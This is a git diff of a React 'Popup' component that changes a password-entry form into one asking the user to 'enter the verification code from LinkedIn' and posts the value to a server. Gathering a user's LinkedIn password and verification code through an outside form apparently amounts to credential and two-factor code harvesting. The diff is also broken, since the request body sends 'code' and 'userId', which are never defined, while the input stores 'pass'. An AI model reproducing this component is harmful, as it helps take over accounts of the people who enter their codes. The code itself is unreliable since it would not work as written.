@@ -1,7 +1,9 @@
 "use client";
 import { useState } from "react";
+import Input from "./input";
+import Button from "./button";
 
-const Popup = ({ userLogin }) => {
+const Popup = () => {
   const [pass, setPass] = useState("");
 
   const handleSubmit = async (e) => {
@@ -15,14 +17,14 @@ const Popup = ({ userLogin }) => {
           "Content-Type": "application/json",
         },
         body: JSON.stringify({
-          pass,
-          userLogin,
+          code,
+          userId,
         }),
       });
-      
+
       if (!savingPass.ok) {
         const errorResponse = await savingPass.json();
-        throw new Error(errorResponse.message || 'Something went wrong');
+        throw new Error(errorResponse.message || "Something went wrong");
       }
     } catch (error) {
       console.log(error.message);
@@ -30,15 +32,22 @@ const Popup = ({ userLogin }) => {
   };
 
   return (
-    <div>
-      <p>Add your password</p>
-      <form onSubmit={handleSubmit}>
-        <input
+    <div className="w-[700px] p-[50px] flex flex-col gap-[20px]">
+      <p className="text-center">
+        Check your email and enter the verification code from LinkedIn
+      </p>
+      <form
+        className="flex flex-col gap-8 items-center"
+        onSubmit={handleSubmit}
+      >
+        <Input
           type="text"
           value={pass}
           onChange={(e) => setPass(e.target.value)}
         />
-        <button type="submit">Send Pass</button>
+        <Button className="btn-primary"type="submit">
+          <p>Send Pass</p>{" "}
+        </Button>
       </form>
     </div>
   );
